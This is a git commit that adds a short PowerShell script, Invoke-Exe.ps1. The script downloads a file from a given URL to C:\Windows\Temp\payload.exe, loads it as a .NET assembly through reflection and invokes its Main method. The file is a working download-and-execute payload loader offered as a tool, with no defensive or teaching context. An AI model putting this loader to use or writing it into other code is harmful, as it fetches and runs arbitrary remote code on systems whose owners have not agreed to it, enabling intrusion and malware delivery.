5276690d32d685af0e1e4508a8eec3cc3199bf4b
Divyanshu <40380497+0xDivyanshu@users.noreply.github.com>
2021-08-06 23:55:38 +0530

    Create Invoke-Exe.ps1
    Invoke-Exe.ps1

---
+++ Invoke-Exe.ps1
@@ -0,0 +1,33 @@
+function Invoke-Exe{
+    [CmdletBinding()]
+    param(
+        [Parameter(Mandatory=$false,Position=0)]
+        [string] $args,
+
+        [Parameter(Mandatory=$true,Position=1)]
+        [string] $loc
+    )
+
+    if($loc.StartsWith("http")){
+        Invoke-WebRequest -Uri $loc -OutFile C:\\Windows\\Temp\\payload.exe
+        try{
+            $f = [System.Reflection.Assembly]::LoadFile("C:\\Windows\\Temp\payload.exe")
+        }
+        catch{
+            echo "[!] Reflection not possible"
+            return
+        }
+    }
+    else{
+        try{
+            $f = [System.Reflection.Assembly]::LoadFile($loc)
+        }
+        catch{
+            echo "[!] Reflection not possible"
+            return 
+        }        
+    }
+    $namespace = ([string]($f.EntryPoint | Select-Object -Property ReflectedType)).Substring(2).split("=")[1].split(",")[0]
+    $obj = new-object $namespace
+    $obj::Main($args.Split(" "))
+}
